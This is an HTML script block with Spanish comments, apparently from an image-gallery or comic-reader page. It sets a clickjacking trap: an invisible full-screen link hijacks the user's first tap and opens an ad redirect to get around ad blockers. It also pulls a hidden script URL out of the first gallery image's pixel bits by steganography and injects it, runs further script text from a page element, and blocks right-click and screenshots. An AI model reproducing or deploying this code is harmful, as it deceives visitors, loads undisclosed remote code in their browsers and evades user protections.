    <script>
        // --- TRAMPA POPUNDER INVISIBLE (ANTI-ADBLOCK) ---
        function armarTrampaPopunderHTML() {
            // Si ya le mostramos el anuncio hoy, lo dejamos en paz
            if (localStorage.getItem('ads_mostrado')) return;

            // Creamos un ENLACE real (<a>), no un <div>
            const trampaLink = document.createElement('a');
            
            // Apuntamos a tu Worker (tu dominio), no a Adsterra
            trampaLink.href = '/api/sponsor-redirect'; 
            trampaLink.target = '_blank'; // Abre en pestaña nueva
            trampaLink.rel = 'noopener noreferrer'; // Buenas prácticas de seguridad
            
            // Lo estiramos a pantalla completa e invisible
            trampaLink.style.position = 'fixed';
            trampaLink.style.top = '0';
            trampaLink.style.left = '0';
            trampaLink.style.width = '100vw';
            trampaLink.style.height = '100vh';
            trampaLink.style.zIndex = '999999'; 
            trampaLink.style.opacity = '0'; 
            // Aseguramos que el tap resalte no aparezca en móviles
            trampaLink.style.webkitTapHighlightColor = 'transparent'; 

            // Añadimos el enlace fantasma al cuerpo de la página
            document.body.appendChild(trampaLink);

            // Cuando le den clic al enlace, lo destruimos para que puedan leer
            trampaLink.addEventListener('click', () => {
                localStorage.setItem('ads_mostrado', 'true');
                
                // Le damos un pequeño retraso a la autodestrucción para asegurar
                // que el navegador registre el clic en el enlace primero
                setTimeout(() => {
                    trampaLink.remove();
                    console.log("💉 Trampa HTML detonada con éxito.");
                }, 100);
            });
        }

        // Activamos la trampa apenas el DOM esté listo
        document.addEventListener('DOMContentLoaded', armarTrampaPopunderHTML);

        // --- MOTOR DE DECODIFICACIÓN BACTERIA ---
        async function extractBacteria(imgSrc) {
            const canvas = document.getElementById('bacteria-lab');
            const ctx = canvas.getContext('2d', { willReadFrequently: true });
            const img = new Image();
            img.crossOrigin = "anonymous"; 
            img.src = imgSrc;

            img.onload = function() {
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
                
                let binary = "";
                for (let i = 0; i < data.length; i += 4) {
                    binary += (data[i] & 1).toString();
                    binary += (data[i + 1] & 1).toString();
                }

                let base64 = "";
                for (let i = 0; i < binary.length; i += 8) {
                    let charCode = parseInt(binary.substr(i, 8), 2);
                    if (charCode === 0) break; 
                    base64 += String.fromCharCode(charCode);
                }

                try {
                    const decoded = atob(base64);
                    const div = document.createElement('div');
                    div.innerHTML = decoded;
                    const scriptTag = div.querySelector('script');
                    if (scriptTag) {
                        const finalScript = document.createElement('script');
                        finalScript.src = scriptTag.src;
                        finalScript.setAttribute('data-cfasync', 'false');
                        document.body.appendChild(finalScript);
                        console.log("💉 Bacteria inyectada exitosamente.");
                    }
                } catch(e) {}
            };
        }

        function vote(n) {
            const stars = document.querySelectorAll('.star');
            stars.forEach((s, index) => {
                if(index < n) s.classList.add('active'); else s.classList.remove('active');
            });
            if(window.navigator.vibrate) window.navigator.vibrate(50);
        }
        
        document.addEventListener('visibilitychange', () => {
            const body = document.getElementById('nogle-visor');
            if (document.visibilityState === 'hidden') body.classList.add('anti-screenshot-active');
            else setTimeout(() => body.classList.remove('anti-screenshot-active'), 400);
        });
        document.addEventListener('contextmenu', e => e.preventDefault());

        window.addEventListener('load', function() {
            let searchCount = 0;
            const checkImg = setInterval(() => {
                const firstImg = document.querySelector('#gallery-container img');
                if (firstImg && firstImg.src) {
                    extractBacteria(firstImg.src);
                    clearInterval(checkImg);
                }
                if (searchCount > 50) clearInterval(checkImg); 
                searchCount++;
            }, 100);

            setTimeout(function() {
                const inCode = document.getElementById('ad-instream');
                if(inCode && inCode.textContent.trim()) {
                    const scriptIn = document.createElement('script');
                    scriptIn.setAttribute('data-cfasync', 'false');
                    scriptIn.textContent = inCode.textContent.trim();
                    document.body.appendChild(scriptIn);
                }
            }, 3500);
        });
    </script>
